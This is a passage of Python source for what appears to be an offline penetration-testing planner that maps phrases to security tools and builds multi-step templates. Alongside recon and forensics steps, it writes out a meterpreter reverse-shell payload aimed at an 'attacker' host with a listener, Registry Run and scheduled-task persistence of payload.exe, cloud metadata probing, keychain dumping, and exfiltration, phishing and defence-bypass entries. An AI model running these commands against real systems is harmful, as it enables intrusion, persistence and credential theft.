        "TXT +short o-o.myaddr.l.google.com @ns1.google.com",
    ),
    (
        "public ip",
        "dig",
        "Public IP address lookup",
        "TXT +short o-o.myaddr.l.google.com @ns1.google.com",
    ),
    ("list files", "ls", "List directory contents", "-la"),
    ("list directory", "ls", "List directory contents", "-la"),
    ("show files", "ls", "List directory contents", "-la"),
    ("show directory", "ls", "List directory contents", "-la"),
    ("directory listing", "ls", "List directory contents", "-la"),
    ("current date", "date", "Show current date and time", ""),
    ("current time", "date", "Show current date and time", ""),
    ("what time", "date", "Show current date and time", ""),
    ("what date", "date", "Show current date and time", ""),
    ("disk usage", "df", "Show disk usage", "-h"),
    ("disk space", "df", "Show disk space", "-h"),
    ("memory usage", "free", "Show memory usage", ""),
    ("free memory", "free", "Show memory usage", "-h"),
    ("how much ram", "free", "Show memory usage", "-h"),
    ("who is logged in", "who", "List logged-in users", ""),
    ("who logged", "who", "List logged-in users", ""),
    ("logged in users", "who", "List logged-in users", ""),
    ("system uptime", "uptime", "Show system uptime", ""),
    ("uptime", "uptime", "Show system uptime", ""),
    ("process list", "ps", "List running processes", "aux"),
    ("running processes", "ps", "List running processes", "aux"),
    ("cpu usage", "top", "Show CPU usage", "-bn1"),
    ("check cpu", "top", "Show CPU usage", "-bn1"),
    ("battery status", "acpi", "Show battery status", ""),
    ("battery level", "acpi", "Show battery level", ""),
    # ── Windows Privilege Escalation ────────────────────────────────────────
    ("windows privilege", "winpeas", "Windows privilege escalation enumeration", ""),
    ("token impersonation", "incognito", "Token impersonation privilege escalation", ""),
    ("juicy potato", "JuicyPotatoNG", "JuicyPotato privilege escalation", ""),
    ("print spoofer", "PrintSpoofer", "PrintSpoofer privilege escalation", ""),
    ("god potato", "GodPotato", "GodPotato privilege escalation", ""),
    ("unquoted service", "winpeas", "Unquoted service path enumeration", ""),
    ("seimpersonate", "winpeas", "SeImpersonatePrivilege check", ""),
    # ── Linux Privilege Escalation ──────────────────────────────────────────
    ("linux privilege", "linpeas", "Linux privilege escalation enumeration", ""),
    ("suid binary", "find", "SUID binary search", "/ -perm -4000 -type f 2>/dev/null"),
    ("sudo abuse", "sudo", "Sudo abuse privilege escalation", "-l"),
    ("nfs root squash", "showmount", "NFS root squash exploitation", "-e"),
    ("cron abuse", "crontab", "Cron job abuse", "-l"),
    ("capabilities exploit", "getcap", "Linux capabilities exploitation", "-r / 2>/dev/null"),
    # ── Lateral Movement ────────────────────────────────────────────────────
    ("pass the hash", "crackmapexec", "Pass-the-Hash lateral movement", "smb"),
    ("pass the ticket", "rubeus", "Pass-the-Ticket Kerberos attack", "ptt"),
    ("over pass the hash", "rubeus", "Overpass-the-Hash attack", "asktgt"),
    ("wmi exec", "wmiexec", "WMI remote execution", ""),
    ("lateral movement", "crackmapexec", "Lateral movement enumeration", "smb"),
    ("rdp lateral", "xfreerdp", "RDP lateral movement", "/v:"),
    ("port forward", "chisel", "Port forwarding via Chisel", "client"),
    ("socks proxy", "chisel", "SOCKS5 proxy via Chisel", "client --socks5"),
    # ── Persistence ─────────────────────────────────────────────────────────
    ("scheduled task", "schtasks", "Windows scheduled task persistence", "/create"),
    (
        "registry run",
        "reg",
        "Registry Run key persistence",
        "add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    ),
    ("web shell", "weevely", "Web shell deployment", ""),
    ("cron persistence", "crontab", "Cron-based persistence", "-e"),
    ("startup persistence", "autoruns", "Startup persistence enumeration", ""),
    # ── Defense Evasion ─────────────────────────────────────────────────────
    ("amsi bypass", "amsi-bypass", "AMSI bypass", ""),
    ("etw bypass", "etw-bypass", "ETW patching bypass", ""),
    ("av bypass", "veil", "Antivirus evasion bypass", ""),
    ("edr bypass", "veil", "EDR evasion technique", ""),
    ("uac bypass", "fodhelper", "UAC bypass technique", ""),
    ("defense evasion", "veil", "Defense evasion via payload encoding", ""),
    ("payload obfuscation", "veil", "Payload obfuscation", ""),
    # ── Data Exfiltration ───────────────────────────────────────────────────
    ("dns exfil", "iodine", "DNS-based data exfiltration", ""),
    ("dns tunnel", "iodine", "DNS tunneling for exfiltration", ""),
    ("icmp tunnel", "ptunnel-ng", "ICMP tunnel for data exfiltration", ""),
    ("data exfil", "curl", "HTTP-based data exfiltration", ""),
    ("covert channel", "iodine", "Covert channel exfiltration", ""),
    # ── Social Engineering ──────────────────────────────────────────────────
    ("phishing campaign", "gophish", "Phishing campaign setup", ""),
    ("spear phishing", "gophish", "Spear phishing campaign", ""),
    ("clone site", "set", "Website cloning for phishing", ""),
    ("credential harvest", "evilginx2", "Credential harvesting reverse proxy", ""),
    (
        "email spoofing",
        "swaks",
        "Email spoofing test",
        "--to target@example.com --from spoof@example.com",
    ),
    # ── IoT / Firmware ──────────────────────────────────────────────────────
    ("firmware analysis", "binwalk", "Firmware analysis and extraction", "-e"),
    ("firmware extract", "binwalk", "Firmware extraction", "-eM"),
    ("iot device", "nmap", "IoT device discovery", "-sV --script banner"),
    ("uart console", "minicom", "UART serial console access", ""),
    ("jtag debug", "openocd", "JTAG debugging interface", ""),
    ("flash dump", "flashrom", "Flash memory dump", ""),
    # ── OT / ICS / SCADA ───────────────────────────────────────────────────
    ("modbus scan", "mbtget", "Modbus device enumeration", ""),
    ("ics recon", "plcscan", "ICS/SCADA device discovery", ""),
    ("scada enum", "plcscan", "SCADA system enumeration", ""),
    ("dnp3 scan", "nmap", "DNP3 protocol scan", "--script dnp3-info -p 20000"),
    ("s7 scan", "nmap", "Siemens S7 PLC scan", "--script s7-info -p 102"),
    ("plc discovery", "plcscan", "PLC device discovery", ""),
    # ── Mobile Security ─────────────────────────────────────────────────────
    ("android analysis", "mobsf", "Android application security analysis", ""),
    ("apk analysis", "apktool", "APK decompilation and analysis", "d"),
    ("ios analysis", "objection", "iOS application security analysis", "explore"),
    ("ssl pinning bypass", "objection", "SSL certificate pinning bypass", "ios sslpinning disable"),
    ("root detection bypass", "objection", "Root detection bypass", "android root disable"),
    ("frida hook", "frida", "Frida dynamic instrumentation hook", ""),
    ("runtime analysis", "frida", "Mobile app runtime analysis", ""),
    # ── Cloud Attack ────────────────────────────────────────────────────────
    ("azure ad enum", "aadinternals", "Azure AD enumeration", ""),
    ("azure enum", "roadtools", "Azure environment enumeration", ""),
    ("gcp enum", "gcloud", "GCP environment enumeration", "projects list"),
    (
        "cloud metadata",
        "curl",
        "Cloud metadata service enumeration",
        "-s http://169.254.169.254/latest/meta-data/",
    ),
    (
        "imds enum",
        "curl",
        "Instance Metadata Service enumeration",
        "-s http://169.254.169.254/latest/meta-data/",
    ),
    ("iam enum", "gcloud", "IAM permissions enumeration", "projects get-iam-policy"),
    # ── Kubernetes / Container ──────────────────────────────────────────────
    ("kubernetes attack", "kubectl", "Kubernetes attack surface enumeration", "auth can-i --list"),
    ("k8s attack", "kubectl", "Kubernetes attack enumeration", "auth can-i --list"),
    ("container escape", "cdk", "Container escape exploitation", "auto-escape"),
    ("etcd access", "etcdctl", "Etcd datastore access", "get / --prefix"),
    (
        "rbac audit",
        "kubectl",
        "Kubernetes RBAC audit",
        "auth can-i --list --as system:serviceaccount",
    ),
    # ── Cryptography / Hash ─────────────────────────────────────────────────
    ("hash identify", "hashid", "Hash type identification", ""),
    ("hash crack", "hashcat", "Password hash cracking", "-a 0"),
    ("rainbow table", "hashcat", "Rainbow table attack", "-a 0 -O"),
    ("padding oracle", "padbuster", "Padding oracle attack", ""),
    # ── CTF ─────────────────────────────────────────────────────────────────
    ("ctf forensics", "foremost", "CTF forensics file carving", ""),
    ("ctf stego", "steghide", "CTF steganography extraction", "extract -sf"),
    ("ctf crypto", "rsactftool", "CTF cryptography tool", ""),
    ("ctf pwn", "pwndbg", "CTF binary exploitation", ""),
    ("buffer overflow", "pwndbg", "Buffer overflow exploitation", ""),
    ("rop chain", "ROPgadget", "ROP chain construction", "--binary"),
    ("heap exploit", "pwndbg", "Heap exploitation", ""),
    ("format string", "pwndbg", "Format string vulnerability exploitation", ""),
    # ── Purple Team / Threat Hunting ────────────────────────────────────────
    ("atomic red team", "invoke-atomicredteam", "Atomic Red Team attack simulation", ""),
    ("attack simulation", "caldera", "MITRE ATT&CK attack simulation", ""),
    ("threat hunt", "osquery", "Threat hunting via endpoint query", ""),
    ("sigma hunt", "sigmac", "Sigma rule threat hunting", ""),
    ("yara hunt", "yara", "YARA rule threat hunting", ""),
    # ── Bug Bounty ───────────────────────────────────────────────────────────
    ("bug bounty", "nuclei", "Bug bounty vulnerability scan", "-severity medium,high,critical"),
    ("responsible disclosure", "nuclei", "Responsible disclosure vulnerability scan", ""),
    # ── Supply Chain ─────────────────────────────────────────────────────────
    ("supply chain", "pip-audit", "Supply chain vulnerability audit", ""),
    ("dependency confusion", "confused", "Dependency confusion attack check", ""),
    ("typosquatting", "pip-audit", "Typosquatting package check", ""),
]


class RegistryPlanner:
    """Heuristic planner using templates, keyword index, and intent matching.

    Pure offline — no LLM dependency. Uses an inverted-index strategy for
    scalable tool lookup and template-based workflow generation.
    """

    def __init__(self) -> None:
        self._plans: dict[str, ExecutionPlan] = {}
        self._nlp = NaturalLanguageParser()
        self._auto_dag_templates: set[str] = {
            "recon_full",
            "web_audit",
            "network_scan",
            "cloud_audit",
            "vuln_scan",
            "dns_recon",
            "full_audit",
            "smb_enum",
            "passive_recon",
            "osint_recon",
            "external_recon",
            "email_recon",
            "subdomain_enum",
            "dir_brute",
            "ct_log",
            # Non-scanning templates
            "memory_forensics",
            "disk_forensics",
            "code_review_sast",
            "secrets_scan",
            "container_scan",
            "iac_scan",
            "cloud_audit_aws",
            "malware_analysis",
            "reverse_engineering",
            "windows_privesc",
            "linux_privesc_full",
            "lateral_movement",
            "persistence",
            "c2_setup",
            "phishing_campaign",
            "iot_firmware",
            "ics_recon",
            "mobile_android",
            "mobile_ios",
            "cloud_azure",
            "cloud_gcp",
            "k8s_attack",
            "crypto_attack",
            "ctf_forensics",
            "ctf_pwn",
            "ctf_crypto",
            "threat_hunting",
            "incident_response_full",
            "purple_team",
            "edr_bypass",
            "data_exfiltration",
            "social_engineering",
            "bug_bounty_web",
            "supply_chain",
        }
        self._cron_path = "/etc/crontab" if os.name != "nt" else "C:\\Windows\\System32\\Tasks"
        self._templates: dict[str, list[dict[str, Any]]] = self._build_templates()
        self._keyword_index: dict[str, set[str]] = {}

    def _build_templates(self) -> dict[str, list[dict[str, Any]]]:
        return {
            "recon_full": [
                {
                    "description": "Full port scan with service/OS detection and default scripts",
                    "tool": "nmap",
                    "args": {"flags": "-sV -sC -T4"},
                },
                {
                    "description": "Web technology stack fingerprinting",
                    "tool": "whatweb",
                    "args": {},
                },
                {
                    "description": "Directory and file brute-force enumeration",
                    "tool": "gobuster",
                    "args": {"mode": "dir"},
                },
                {"description": "Passive subdomain enumeration", "tool": "subfinder", "args": {}},
                {
                    "description": "Aggressive subdomain discovery via brute-force",
                    "tool": "amass",
                    "args": {},
                },
                {
                    "description": "Template-based vulnerability scan",
                    "tool": "nuclei",
                    "args": {"severity": "medium,high,critical"},
                },
            ],
            "web_audit": [
                {
                    "description": "HTTP security headers and response analysis",
                    "tool": "curl",
                    "args": {"flags": "-sI"},
                },
                {
                    "description": "Web application technology fingerprinting",
                    "tool": "whatweb",
                    "args": {},
                },
                {
                    "description": "Template-based vulnerability scanning (medium+ severity)",
                    "tool": "nuclei",
                    "args": {"severity": "medium,high,critical"},
                },
                {
                    "description": "Content discovery and directory/file enumeration",
                    "tool": "ffuf",
                    "args": {"wordlist": "common.txt"},
                },
                {
                    "description": "WordPress-specific vulnerability scan",
                    "tool": "wpscan",
                    "args": {},
                },
                {"description": "Web server vulnerability scan", "tool": "nikto", "args": {}},
            ],
            "headers_check": [
                {
                    "description": "HTTP security headers analysis",
                    "tool": "curl",
                    "args": {"flags": "-sI"},
                },
                {
                    "description": "SSL/TLS certificate inspection",
                    "tool": "openssl",
                    "args": {"flags": "s_client -connect {target}:443 -servername {target}"},
                },
            ],
            "cors_check": [
                {
                    "description": "CORS headers and preflight analysis",
                    "tool": "curl",
                    "args": {"flags": "-sI -H 'Origin: https://evil.com'"},
                },
                {
                    "description": "Verbose CORS header extraction",
                    "tool": "curl",
                    "args": {
                        "flags": "-s -D - -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: GET' -X OPTIONS"
                    },
                },
            ],
            "ssl_audit": [
                {
                    "description": "SSL/TLS certificate chain validation",
                    "tool": "openssl",
                    "args": {"flags": "s_client -connect {target}:443 -servername {target}"},
                },
                {
                    "description": "SSL/TLS cipher suite enumeration",
                    "tool": "nmap",
                    "args": {"flags": "--script ssl-enum-ciphers -p 443"},
                },
                {
                    "description": "SSL/TLS certificate info via nmap",
                    "tool": "nmap",
                    "args": {"flags": "--script ssl-cert -p 443"},
                },
            ],
            "brute_force": [
                {
                    "description": "Target service discovery and version identification",
                    "tool": "nmap",
                    "args": {"flags": "-sV"},
                },
                {
                    "description": "Multi-protocol credential brute-force attack",
                    "tool": "hydra",
                    "args": {},
                },
                {
                    "description": "Offline password cracking of captured credentials",
                    "tool": "hashcat",
                    "args": {},
                },
            ],
            "file_hash": [
                {
                    "description": "Compute MD5 hash of a file",
                    "tool": "md5sum",
                    "args": {},
                },
                {
                    "description": "Compute SHA-1 hash of a file",
                    "tool": "sha1sum",
                    "args": {},
                },
                {
                    "description": "Compute SHA-256 hash of a file",
                    "tool": "sha256sum",
                    "args": {},
                },
                {
                    "description": "Compute SHA-512 hash of a file",
                    "tool": "sha512sum",
                    "args": {},
                },
            ],
            "wifi_audit": [
                {
                    "description": "Wireless traffic capture and handshake collection",
                    "tool": "aircrack-ng",
                    "args": {"mode": "capture"},
                },
                {
                    "description": "WPA/WPA2 PSK handshake offline crack",
                    "tool": "aircrack-ng",
                    "args": {"mode": "crack"},
                },
            ],
            "network_scan": [
                {
                    "description": "Full TCP port sweep with high-rate discovery",
                    "tool": "nmap",
                    "args": {"flags": "-sT -T4 -p- --min-rate 1000"},
                },
                {
                    "description": "Service version detection on top 1000 ports",
                    "tool": "nmap",
                    "args": {"flags": "-sV -T4 --top-ports 1000"},
                },
                {
                    "description": "DNS record resolution and zone analysis",
                    "tool": "dig",
                    "args": {},
                },
                {
                    "description": "WHOIS registration and IP ownership lookup",
                    "tool": "whois",
                    "args": {},
                },
                {
                    "description": "Mass port scan for additional coverage",
                    "tool": "masscan",
                    "args": {"flags": "--rate 1000 --top-ports 100"},
                },
            ],
            "cloud_audit": [
                {
                    "description": "HTTP security headers and CORS policy analysis",
                    "tool": "curl",
                    "args": {"flags": "-sI"},
                },
                {
                    "description": "Web application stack and framework detection",
                    "tool": "whatweb",
                    "args": {},
                },
                {
                    "description": "Full DNS record enumeration (A, AAAA, MX, TXT, NS, CNAME)",
                    "tool": "dig",
                    "args": {"flags": "ANY"},
                },
                {
                    "description": "SSL/TLS certificate chain and cipher suite validation",
                    "tool": "openssl",
                    "args": {"flags": "s_client -servername"},
                },
            ],
            "ad_assessment": [
                {
                    "description": "Domain controller critical port scan",
                    "tool": "nmap",
                    "args": {
                        "flags": "-sT -sV -T4 -p 53,88,135,139,389,445,464,636,3268,3269,3389"
                    },
                },
                {
                    "description": "SMB protocol version and dialect negotiation analysis",
                    "tool": "nmap",
                    "args": {"flags": "-sV -p 445 --script smb-protocols"},
                },
                {
                    "description": "LDAP anonymous bind and root DSE information disclosure check",
                    "tool": "nmap",
                    "args": {"flags": "-sV -p 389 --script ldap-rootdse"},
                },
                {
                    "description": "Kerberos user enumeration attempt",
                    "tool": "nmap",
                    "args": {"flags": "-sV -p 88 --script krb5-enum-users"},
                },
            ],
            "linux_privesc": [
                {
                    "description": "Kernel and OS version identification",
                    "tool": "uname",
                    "args": {"flags": "-a"},
                },
                {
                    "description": "SUID and SGID binary discovery",
                    "tool": "find",
                    "args": {"flags": "/ -perm -4000 -type f 2>/dev/null"},
                },
                {
                    "description": "World-writable directory search",
                    "tool": "find",
                    "args": {"flags": "/ -writable -type d 2>/dev/null"},
                },
                {
                    "description": "Scheduled task and cron job inspection",
                    "tool": "cat",
                    "args": {"flags": self._cron_path},
                },
            ],
            "vuln_scan": [
                {
                    "description": "Template-based vulnerability scan (all severities)",
                    "tool": "nuclei",
                    "args": {"severity": "low,medium,high,critical"},
                },
                {"description": "Web server vulnerability scan", "tool": "nikto", "args": {}},
                {"description": "WordPress vulnerability scan", "tool": "wpscan", "args": {}},
                {
                    "description": "SQL injection scan",
                    "tool": "sqlmap",
                    "args": {"flags": "--batch --random-agent"},
                },
            ],
            "dns_recon": [
                {
                    "description": "DNS record enumeration (A, AAAA, MX, TXT, NS, CNAME, SOA)",
                    "tool": "dig",
                    "args": {},
                },
                {"description": "Passive subdomain discovery", "tool": "subfinder", "args": {}},
                {
                    "description": "Brute-force subdomain discovery via wordlist",
                    "tool": "amass",
                    "args": {},
                },
                {
                    "description": "WHOIS registration and domain ownership lookup",
                    "tool": "whois",
                    "args": {},
                },
            ],
            "full_audit": [
                {
                    "description": "Full port scan with service and OS detection",
                    "tool": "nmap",
                    "args": {"flags": "-sV -sC -T4"},
                },
                {
                    "description": "HTTP security headers and response analysis",
                    "tool": "curl",
                    "args": {"flags": "-sI"},
                },
                {"description": "Web technology fingerprinting", "tool": "whatweb", "args": {}},
                {
                    "description": "Template-based vulnerability scan",
                    "tool": "nuclei",
                    "args": {"severity": "medium,high,critical"},
                },
                {
                    "description": "Directory and file enumeration",
                    "tool": "gobuster",
                    "args": {"mode": "dir"},
                },
                {"description": "DNS record enumeration", "tool": "dig", "args": {}},
                {"description": "Subdomain discovery", "tool": "subfinder", "args": {}},
                {"description": "WHOIS registration lookup", "tool": "whois", "args": {}},
            ],
            "passive_recon": [
                {
                    "description": "Web technology stack fingerprinting",
                    "tool": "whatweb",
                    "args": {},
                },
                {
                    "description": "Passive subdomain enumeration via public sources",
                    "tool": "subfinder",
                    "args": {},
                },
                {
                    "description": "DNS record enumeration (A, AAAA, MX, TXT, NS, CNAME, SOA)",
                    "tool": "dig",
                    "args": {},
                },
                {
                    "description": "WHOIS registration and domain ownership lookup",
                    "tool": "whois",
                    "args": {},
                },
                {
                    "description": "Certificate transparency log inspection",
                    "tool": "openssl",
                    "args": {"flags": "s_client -connect {target}:443 -servername {target}"},
                },
            ],
            "smb_enum": [
                {
                    "description": "SMB port scan and service detection",
                    "tool": "nmap",
                    "args": {"flags": "-sV -p 445"},
                },
                {
                    "description": "SMB protocol version and dialect negotiation",
                    "tool": "nmap",
                    "args": {"flags": "-sV -p 445 --script smb-protocols"},
                },
                {
                    "description": "SMB share enumeration",
                    "tool": "nmap",
                    "args": {"flags": "-sV -p 445 --script smb-enum-shares"},
                },
                {
                    "description": "SMB OS discovery and security check",
                    "tool": "nmap",
                    "args": {"flags": "-sV -p 445 --script smb-os-discovery,smb-security-mode"},
                },
            ],
            "osint_recon": [
                {
                    "description": "WHOIS domain registration and ownership lookup",
                    "tool": "whois",
                    "args": {},
                },
                {
                    "description": "DNS record enumeration (A, AAAA, MX, TXT, NS, CNAME, SOA)",
                    "tool": "dig",
                    "args": {},
                },
                {
                    "description": "DNS zone transfer attempt",
                    "tool": "dig",
                    "args": {"flags": "AXFR"},
                },
                {
                    "description": "Certificate transparency log search via crt.sh",
                    "tool": "curl",
                    "args": {"flags": "-s https://crt.sh/?q={target}&output=json"},
                },
                {"description": "Passive subdomain enumeration", "tool": "subfinder", "args": {}},
                {"description": "Aggressive subdomain discovery", "tool": "amass", "args": {}},
                {"description": "Technology stack fingerprinting", "tool": "whatweb", "args": {}},
            ],
            "external_recon": [
                {
                    "description": "Shodan internet device search",
                    "tool": "shodan",
                    "args": {"flags": "search"},
                },
                {
                    "description": "Certificate transparency log analysis",
                    "tool": "curl",
                    "args": {"flags": "-s https://crt.sh/?q=%25.{target}&output=json"},
                },
                {"description": "Technology stack fingerprinting", "tool": "whatweb", "args": {}},
                {"description": "Passive subdomain enumeration", "tool": "subfinder", "args": {}},
                {"description": "WHOIS registration lookup", "tool": "whois", "args": {}},
                {"description": "Full DNS record enumeration", "tool": "dig", "args": {}},
            ],
            "email_recon": [
                {
                    "description": "Email address harvesting via theHarvester",
                    "tool": "theHarvester",
                    "args": {"flags": "-d {target} -b all"},
                },
                {
                    "description": "MX record lookup for mail servers",
                    "tool": "dig",
                    "args": {"flags": "MX {target}"},
                },
                {
                    "description": "SMTP server enumeration",
                    "tool": "nmap",
                    "args": {"flags": "--script smtp-* -p 25,465,587"},
                },
                {
                    "description": "SPF and DMARC DNS record check",
                    "tool": "dig",
                    "args": {"flags": "TXT {target}"},
                },
            ],
            "ct_log": [
                {
                    "description": "Certificate transparency log search",
                    "tool": "curl",
                    "args": {"flags": "-s https://crt.sh/?q=%25.{target}&output=json"},
                },
            ],
            "subdomain_enum": [
                {"description": "Passive subdomain enumeration", "tool": "subfinder", "args": {}},
            ],
            "dir_brute": [
                {
                    "description": "Directory and file brute-force enumeration",
                    "tool": "gobuster",
                    "args": {"mode": "dir"},
                },
            ],
            # ── Non-scanning templates ──
            "memory_forensics": [
                {
                    "description": "Memory dump analysis with Volatility framework",
                    "tool": "volatility",
                    "args": {"flags": "-f"},
                },
                {
                    "description": "Extract printable strings from memory dump",
                    "tool": "strings",
                    "args": {},
                },
                {
                    "description": "YARA rule scan against memory dump",
                    "tool": "yara",
                    "args": {},
                },
            ],
            "disk_forensics": [
                {
                    "description": "File system metadata analysis with Sleuthkit",
                    "tool": "sleuthkit",
                    "args": {"flags": "fls"},
                },
                {
                    "description": "File carving to recover deleted files",
                    "tool": "foremost",
                    "args": {},
                },
                {
                    "description": "Firmware analysis and embedded file extraction",
                    "tool": "binwalk",
                    "args": {},
                },
                {
                    "description": "Metadata extraction from files",
                    "tool": "exiftool",
                    "args": {},
                },
            ],
            "code_review_sast": [
                {
                    "description": "Multi-language static code security analysis with Semgrep",
                    "tool": "semgrep",
                    "args": {"flags": "--config=auto"},
                },
                {
                    "description": "Python-focused security linter",
                    "tool": "bandit",
                    "args": {"flags": "-r"},
                },
            ],
            "secrets_scan": [
                {
                    "description": "Git repository secrets scanning",
                    "tool": "gitleaks",
                    "args": {"flags": "detect --no-git"},
                },
                {
                    "description": "Credential and secrets scanner",
                    "tool": "trufflehog",
                    "args": {},
                },
            ],
            "container_scan": [
                {
                    "description": "Container image vulnerability scanning",
                    "tool": "trivy",
                    "args": {"flags": "image"},
                },
                {
                    "description": "Container vulnerability scanner",
                    "tool": "grype",
                    "args": {},
                },
                {
                    "description": "Software bill of materials (SBOM) generation",
                    "tool": "syft",
                    "args": {},
                },
            ],
            "iac_scan": [
                {
                    "description": "Infrastructure as Code static analysis for misconfigurations",
                    "tool": "checkov",
                    "args": {"flags": "-d ."},
                },
            ],
            "cloud_audit_aws": [
                {
                    "description": "AWS security auditing against CIS benchmarks",
                    "tool": "prowler",
                    "args": {},
                },
                {
                    "description": "Multi-cloud security audit framework",
                    "tool": "scoutsuite",
                    "args": {},
                },
            ],
            "malware_analysis": [
                {
                    "description": "Extract readable strings from binary",
                    "tool": "strings",
                    "args": {},
                },
                {
                    "description": "Pattern-based malware detection with YARA",
                    "tool": "yara",
                    "args": {},
                },
                {
                    "description": "Metadata extraction from suspicious files",
                    "tool": "exiftool",
                    "args": {},
                },
            ],
            "reverse_engineering": [
                {
                    "description": "Binary analysis with radare2 reverse engineering framework",
                    "tool": "radare2",
                    "args": {},
                },
                {
                    "description": "Android APK decompilation and analysis",
                    "tool": "apktool",
                    "args": {},
                },
            ],
            "windows_privesc": [
                {
                    "description": "Automated Windows privilege escalation enumeration",
                    "tool": "winpeas",
                    "args": {"flags": "quiet"},
                },
                {
                    "description": "Windows privilege escalation checks via PowerShell",
                    "tool": "powerup",
                    "args": {"flags": "Invoke-AllChecks"},
                },
                {
                    "description": "Windows post-exploitation recon with Seatbelt",
                    "tool": "seatbelt",
                    "args": {"flags": "-group=all"},
                },
                {
                    "description": "Token and delegation privilege enumeration",
                    "tool": "incognito",
                    "args": {"flags": "list_tokens -u"},
                },
            ],
            "linux_privesc_full": [
                {
                    "description": "Automated Linux privilege escalation enumeration",
                    "tool": "linpeas",
                    "args": {},
                },
                {
                    "description": "SUID and SGID binary discovery",
                    "tool": "find",
                    "args": {"flags": "/ -perm -4000 -type f 2>/dev/null"},
                },
                {
                    "description": "Linux capabilities enumeration",
                    "tool": "getcap",
                    "args": {"flags": "-r / 2>/dev/null"},
                },
                {
                    "description": "Sudo permissions enumeration",
                    "tool": "sudo",
                    "args": {"flags": "-l"},
                },
                {
                    "description": "Cron job and scheduled task inspection",
                    "tool": "crontab",
                    "args": {"flags": "-l"},
                },
                {
                    "description": "NFS share export enumeration for root squash",
                    "tool": "showmount",
                    "args": {"flags": "-e"},
                },
                {
                    "description": "Process monitoring for credential leakage",
                    "tool": "pspy",
                    "args": {},
                },
            ],
            "lateral_movement": [
                {
                    "description": "SMB host reachability and authentication check",
                    "tool": "crackmapexec",
                    "args": {"flags": "smb"},
                },
                {
                    "description": "WMI remote command execution",
                    "tool": "wmiexec",
                    "args": {"flags": "-nopass"},
                },
                {
                    "description": "SMB relay and remote execution",
                    "tool": "smbexec",
                    "args": {},
                },
                {
                    "description": "SOCKS5 proxy tunnel for pivoting",
                    "tool": "chisel",
                    "args": {"flags": "client --socks5"},
                },
                {
                    "description": "RDP lateral movement",
                    "tool": "xfreerdp",
                    "args": {"flags": "/v:{target} /dynamic-resolution"},
                },
            ],
            "persistence": [
                {
                    "description": "Windows scheduled task persistence",
                    "tool": "schtasks",
                    "args": {"flags": "/create /sc onlogon /tn Updater /tr payload.exe"},
                },
                {
                    "description": "Registry Run key persistence",
                    "tool": "reg",
                    "args": {
                        "flags": "add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d payload.exe"
                    },
                },
                {
                    "description": "Linux cron-based persistence",
                    "tool": "crontab",
                    "args": {"flags": "-e"},
                },
                {
                    "description": "Autoruns enumeration for persistence locations",
                    "tool": "autoruns",
                    "args": {},
                },
            ],
            "c2_setup": [
                {
                    "description": "Generate reverse shell payload with msfvenom",
                    "tool": "msfvenom",
                    "args": {
                        "flags": "-p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe"
                    },
                },
                {
                    "description": "Start Metasploit multi-handler listener",
                    "tool": "msfconsole",
                    "args": {
                        "flags": "-q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'"
                    },
                },
                {
                    "description": "C2 infrastructure port check",
                    "tool": "nmap",
                    "args": {"flags": "-sT -p 4444,8080,8443,443,80"},
                },
            ],
            "phishing_campaign": [
                {
                    "description": "Set up GoPhish phishing campaign server",
                    "tool": "gophish",
                    "args": {},
                },
                {
                    "description": "Clone target website for phishing",
                    "tool": "set",
                    "args": {"flags": "2 3"},
                },
                {
                    "description": "Harvest target email addresses",
                    "tool": "theHarvester",
                    "args": {"flags": "-d {target} -b all"},
                },
                {
                    "description": "Test email spoofing deliverability",
                    "tool": "swaks",
                    "args": {"flags": "--to target@{target} --from spoof@{target}"},
                },
                {
                    "description": "SPF/DMARC/DKIM email security posture check",
                    "tool": "dig",
                    "args": {"flags": "TXT {target}"},
                },
            ],
            "iot_firmware": [
                {
                    "description": "Firmware analysis and file system extraction",
                    "tool": "binwalk",
                    "args": {"flags": "-eM"},
                },
                {
                    "description": "Extract printable strings from firmware",
                    "tool": "strings",
                    "args": {},
                },
                {
                    "description": "Binary hardening and security feature check",
                    "tool": "checksec",
                    "args": {"flags": "--file"},
                },
                {
                    "description": "Metadata and EXIF data extraction",
                    "tool": "exiftool",
                    "args": {},
                },
                {
                    "description": "YARA malware pattern scan on firmware",
                    "tool": "yara",
                    "args": {},
                },
            ],
            "ics_recon": [
                {
                    "description": "ICS/SCADA device discovery via Nmap ICS scripts",
                    "tool": "nmap",
                    "args": {
                        "flags": "--script modbus-discover,dnp3-info,s7-info -p 102,502,20000"
                    },
                },
                {
                    "description": "Modbus device enumeration",
                    "tool": "mbtget",
                    "args": {},
                },
                {
                    "description": "PLC device discovery and enumeration",
                    "tool": "plcscan",
                    "args": {},
                },
                {
                    "description": "Shodan search for ICS/SCADA exposed devices",
                    "tool": "shodan",
                    "args": {"flags": "search port:502 modbus"},
                },
            ],
            "mobile_android": [
                {
                    "description": "Pull APK from Android device via ADB",
                    "tool": "adb",
                    "args": {"flags": "shell pm list packages -3"},
                },
                {
                    "description": "Decompile APK for static analysis",
                    "tool": "apktool",
                    "args": {"flags": "d"},
                },
                {
                    "description": "Scan APK for secrets and hardcoded credentials",
                    "tool": "apkleaks",
                    "args": {},
                },
                {
                    "description": "Dynamic analysis and hooking with Frida",
                    "tool": "frida",
                    "args": {"flags": "-U -f com.target.app --no-pause"},
                },
                {
                    "description": "Runtime mobile security testing with Objection",
                    "tool": "objection",
                    "args": {"flags": "explore"},
                },
            ],
            "mobile_ios": [
                {
                    "description": "Attach to iOS process with Frida",
                    "tool": "frida",
                    "args": {"flags": "-U TargetApp"},
                },
                {
                    "description": "iOS runtime analysis with Objection",
                    "tool": "objection",
                    "args": {"flags": "explore"},
                },
                {
                    "description": "Disable SSL certificate pinning",
                    "tool": "objection",
                    "args": {"flags": "ios sslpinning disable"},
                },
                {
                    "description": "Dump iOS keychain data",
                    "tool": "objection",
                    "args": {"flags": "ios keychain dump"},
                },
            ],
            "cloud_azure": [
                {
                    "description": "Azure AD tenant and user enumeration",
                    "tool": "aadinternals",
                    "args": {"flags": "Invoke-AADIntReconAsOutsider"},
                },
                {
                    "description": "Azure environment enumeration via ROADtools",
                    "tool": "roadtools",
                    "args": {"flags": "auth"},
                },
                {
                    "description": "PowerZure Azure privilege assessment",
                    "tool": "powerzure",
